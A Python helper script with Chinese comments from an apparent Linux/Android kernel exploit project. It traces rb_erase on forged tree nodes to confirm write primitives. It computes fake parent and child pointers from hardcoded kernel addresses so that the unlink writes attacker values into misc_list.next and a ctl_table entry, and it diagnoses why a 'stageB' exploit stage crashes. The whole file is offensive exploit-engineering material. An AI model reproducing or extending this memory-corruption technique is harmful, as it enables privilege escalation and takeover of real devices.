#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H12 定论版: 64560 路线 fragment 真实路径 = 0x3a9dc 分支，写原语 = 0x3aa00
"""
def sim(pc, right, left):
    L = []
    def p(s): L.append(s)
    p("入口 x0=node(fragment+off), x8=[x0+8]=rb_right=%#x, x10=[x0+0x10]=rb_left=%#x" % (right, left))
    if left != 0:
        p("cbnz x10 TAKEN -> 0x3aa18  (rb_left!=0，非本几何)")
        return "OTHER", L
    p("cbnz x10 NOT taken -> 0x3a9dc")
    x9 = pc
    p("ldr x9,[x0]  x9 = node->rb_parent_color = %#x" % x9)
    par = x9 & ~3
    p("ands x10,x9,#-4  parent = %#x   (ZF=%d)" % (par, 1 if par==0 else 0))
    if par == 0:
        p("b.eq TAKEN -> 0x3aa00  (x11 = root)")
        p("0x3aa00 str x8,[x11]  => *root = rb_right=%#x" % right)
        return "PATH_root", L
    p("b.eq NOT taken -> x11 = %#x" % par)
    p("0x3a9f0 ldr x12,[x11,#0x10]!  => 读 *(parent+0x10) = parent->rb_left")
    p("        ★★ 若 parent+0x10 不可映射/不可读 => data abort（崩点候选#1）")
    p("0x3a9f8 cmp x12,x0   (parent->rb_left == node ?)")
    p("0x3a9fc csel x11, parent+0x10(if eq), parent+0x8(if ne)")
    p("")
    p("  分支A: parent->rb_left == node => x11 = parent+0x10")
    p("    0x3aa00 str x8,[parent+0x10]  => *(parent+0x10) = rb_right = %#x" % right)
    p("  分支B: parent->rb_left != node => x11 = parent+0x8")
    p("    0x3aa00 str x8,[parent+0x8]   => *(parent+0x8)  = rb_right = %#x  ★★★ 真正 W1" % right)
    p("")
    p("0x3aa04 cbnz x8 TAKEN (rb_right!=0) => 0x3aa10")
    p("0x3aa10 str x9,[x8]  => *(rb_right) = node->rb_parent_color = %#x  ★★ 这是 W2！" % pc)
    p("0x3aa14 ret")
    return "PATH_AA10", L

print("="*82)
print("H12 定论: 64560 fragment 几何 -> rb_erase 0x3a9dc 分支")
print("="*82)

LINK_IMAGE_BASE=0xffffffc080000000
LINK_MISC_LIST =0xffffffc08229b190
MEY_PHYS_DELTA =0x28000000
DMAP = LINK_IMAGE_BASE + MEY_PHYS_DELTA
slide=0x22c8c00000

# stage0: forged_parent = P0alias(ctl_table[boot_id] 的地址) ; forged_child = P0alias(cycleC)
# f77: MEY_DIRECT_BOOTID_PARENT = 0xffffff802a29b090   (就是 ctl_table[boot_id] 的 vaddr 别名)
s0_pc    = 0xffffff802a29b090
s0_right = 0xffffff802a17d5d0

# stageB physmap: forged_parent = P0alias(misc_list)-8?  不！看 f77 L5796:
#   forged_parent = DMAP + (LINK_MISC_LIST-IMAGE_BASE) + PHYS_DELTA - 8   <- 注意 -8!
#   但 build_fake_fragment 把 forged_parent 写进 +0，forged_child 写进 +8。
#   若 forged_parent 已 -8，则 +0 处存的是 (misc_list_phys - 8)，
#   rb_erase 会把它当 node->rb_parent_color，parent = (misc_list_phys-8) & ~3 = misc_list_phys-8
#   => 写 *(parent+8) = misc_list_phys  => 这正是 misc_list.next 槽！✓ 设计意图
sb_pc    = DMAP + (LINK_MISC_LIST-LINK_IMAGE_BASE) + MEY_PHYS_DELTA - 8
sb_right = 0xffffff8040000118

for name, pc, right in [("stage0", s0_pc, s0_right),
                        ("stageB physmap (parent 已 -8)", sb_pc, sb_right),
                        ("stageB 假设 parent 未 -8", DMAP+(LINK_MISC_LIST-LINK_IMAGE_BASE)+MEY_PHYS_DELTA, sb_right)]:
    print("\n### %s" % name)
    path, L = sim(pc, right, 0)
    for l in L: print("   "+l)
    print("   >>> %s" % path)

print("\n"+"="*82)
print("结论:")
print("  1) 64560 fragment: rb_left(@+0x10)=0, rb_right(@+8)=child != 0")
print("     => 走 0x3a9dc, 不碰 0x3ab04。旧 'RE_rb_erase_mechanism' 的 0x3ab0c 写原语")
print("        是 43499 路线的几何, 对 64560 不适用!")
print("  2) 真正 W1 = 0x3aa00: *(forged_parent + 8 or +0x10) = forged_child")
print("     parent->rb_left==node 时写 +0x10; 否则写 +8。")
print("     ctl_table.data 在 +8 => 设计取的是【parent->rb_left != node】分支 => 写 +8 ✓")
print("  3) W2 = 0x3aa10: *(forged_child) = forged_parent   (child->pc 回填)")
print("  4) ★ 崩点候选: 0x3a9f0 `ldr x12,[parent+0x10]` —— 若 forged_parent 不是有效")
print("     可读内核地址 => data abort。这是 stageB 崩溃的最可能来源。")
print("="*82)
